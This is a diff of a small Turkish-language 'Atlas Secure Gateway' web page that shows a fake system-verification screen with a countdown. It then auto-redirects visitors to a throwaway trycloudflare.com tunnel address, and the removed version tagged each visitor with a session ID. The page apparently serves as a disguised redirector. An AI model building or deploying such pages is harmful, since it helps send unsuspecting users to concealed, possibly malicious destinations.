@@ -6,31 +6,17 @@
     <title>Atlas Secure Gateway</title>
 </head>
 <body style="background:#000; color:#00ff00; font-family:monospace; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; margin:0; text-align:center;">
-    
-    <div style="border:1px solid #00ff00; padding:40px; box-shadow: 0 0 20px #00ff00;">
-        <h2 style="letter-spacing:5px;">SİSTEM DOĞRULANIYOR</h2>
-        <p style="color:#555;">Tünel Aktif: 1769625936</p>
-        <div style="font-size:14px; margin:10px 0;">ZİYARETÇİ KODUNUZ:</div>
-        <div id="user-id" style="font-size:24px; color:#fff; font-weight:bold; background:#222; padding:5px; margin-bottom:20px;">OLUŞTURULUYOR...</div>
+    <div style="border:1px solid #00ff00; padding:30px;">
+        <h2>SISTEM AKTIF</h2>
+        <p style="color:#555;">Giris Kodu: 679254</p>
         <div id="timer" style="font-size:40px;">3</div>
     </div>
-
     <script>
-        // SALİSELİK BENZERSİZ KOD ÜRETİCİ
-        const now = new Date();
-        const uniqueID = "ATL-" + now.getTime() + "-" + Math.floor(Math.random() * 1000);
-        document.getElementById('user-id').innerText = uniqueID;
-
         let c = 3;
-        const t = document.getElementById('timer');
-        const interval = setInterval(() => {
+        setInterval(() => {
             c--;
-            t.innerText = c;
-            if(c <= 0) {
-                clearInterval(interval);
-                // Tünele giderken bu benzersiz kodu da yanına alıyoruz
-                window.location.replace("https://mostly-pearl-factory-daily.trycloudflare.com?session=" + uniqueID);
-            }
+            document.getElementById('timer').innerText = c;
+            if(c <= 0) window.location.replace("https://mega-simulations-execute-found.trycloudflare.com");
         }, 1000);
     </script>
 </body>
